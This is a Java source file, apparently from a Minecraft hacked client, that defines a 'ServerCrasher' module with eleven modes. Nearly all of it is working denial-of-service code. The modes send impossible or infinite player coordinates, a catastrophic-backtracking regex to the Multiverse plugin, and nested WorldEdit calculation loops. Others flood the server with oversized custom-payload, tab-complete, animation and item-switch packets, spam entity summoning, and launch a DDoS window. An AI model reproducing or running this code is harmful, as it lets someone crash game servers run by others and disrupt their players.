package zelix.hack.hacks;

import net.minecraft.client.*;
import zelix.hack.*;
import zelix.utils.*;
import zelix.value.*;
import zelix.gui.others.*;
import net.minecraftforge.fml.common.gameevent.*;
import org.apache.commons.lang3.*;
import net.minecraft.util.math.*;
import java.util.*;
import io.netty.buffer.*;
import net.minecraft.network.*;
import net.minecraft.util.*;
import net.minecraft.network.play.client.*;

public class ServerCrasher extends Hack
{
    ModeValue mode;
    public static NumberValue threadNum;
    public static NumberValue delay;
    private Object example;
    private Minecraft mc;
    
    public ServerCrasher() {
        super("ServerCrasher", HackCategory.ANOTHER);
        this.mc = Wrapper.INSTANCE.mc();
        ServerCrasher.threadNum = new NumberValue("Thread", 1.0, 1.0, 128.0);
        this.mode = new ModeValue("Mode", new Mode[] { new Mode("mathoverflow", true), new Mode("multiversecore", false), new Mode("ZwxDDOS", false), new Mode("TabComplete", false), new Mode("Infinity", false), new Mode("WorldEdit", false), new Mode("Session", false), new Mode("OP", false), new Mode("WorldEdit2", false), new Mode("xACK", false), new Mode("IllegalSwitcher", false) });
        ServerCrasher.delay = new NumberValue("Delay", 1000.0, 1.0, 5000.0);
        this.addValue(this.mode, ServerCrasher.threadNum, ServerCrasher.delay);
    }
    
    @Override
    public void onEnable() {
        if (this.mode.getMode("ZwxDDOS").isToggled()) {
            DDOSWindow.main(null);
        }
        super.onEnable();
    }
    
    @Override
    public void onDisable() {
        super.onDisable();
    }
    
    @Override
    public void onPlayerTick(final TickEvent.PlayerTickEvent e) {
        if (this.mode.getMode("mathoverflow").isToggled()) {
            Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Wrapper.INSTANCE.player().onGround));
        }
        else if (this.mode.getMode("multiversecore").isToggled()) {
            Wrapper.INSTANCE.player().sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
        }
    }
    
    @Override
    public void onClientTick(final TickEvent.ClientTickEvent event) {
        if (this.mode.getMode("TabComplete").isToggled()) {
            for (int i = 0; i < (double)ServerCrasher.delay.value; ++i) {
                final double rand1 = RandomUtils.nextDouble(0.0, Double.MAX_VALUE);
                final double rand2 = RandomUtils.nextDouble(0.0, Double.MAX_VALUE);
                final double rand3 = RandomUtils.nextDouble(0.0, Double.MAX_VALUE);
                this.mc.player.connection.sendPacket((Packet)new CPacketTabComplete("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e", new BlockPos(rand1, rand2, rand3), false));
            }
        }
        else if (this.mode.getMode("Infinity").isToggled()) {
            this.mc.player.connection.sendPacket((Packet)new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, new Random().nextBoolean()));
            this.mc.player.connection.sendPacket((Packet)new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, new Random().nextBoolean()));
        }
        else if (this.mode.getMode("WorldEdit").isToggled()) {
            if (this.mc.player.ticksExisted % 6 == 0) {
                this.mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                this.mc.player.sendChatMessage("//calculate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                this.mc.player.sendChatMessage("//solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                this.mc.player.sendChatMessage("//evaluate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                this.mc.player.sendChatMessage("//eval for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
            }
        }
        else if (this.mode.getMode("Session").isToggled()) {
            for (int i = 0; i < 500; ++i) {
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|Brand", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BOpen", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|TrList", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|TrSel", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BEdit", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
            }
        }
        else if (this.mode.getMode("OP").isToggled()) {
            for (int i = 0; i < 250; ++i) {
                this.mc.player.sendChatMessage("/execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ summon Villager");
            }
        }
        else if (this.mode.getMode("WorldEdit2").isToggled()) {
            for (int i = 0; i < 250; ++i) {
                this.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("WECUI", new PacketBuffer(Unpooled.buffer()).writeString("\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI")));
            }
        }
        else if (this.mode.getMode("xACK").isToggled()) {
            for (int i = 0; i < 5000; ++i) {
                this.mc.player.connection.sendPacket((Packet)new CPacketAnimation(EnumHand.OFF_HAND));
            }
        }
        else if (this.mode.getMode("IllegalSwitcher").isToggled()) {
            for (int i = 0; i < 550; ++i) {
                for (int i2 = 0; i2 < 8; ++i2) {
                    this.mc.player.connection.sendPacket((Packet)new CPacketHeldItemChange(i2));
                }
            }
        }
    }
}
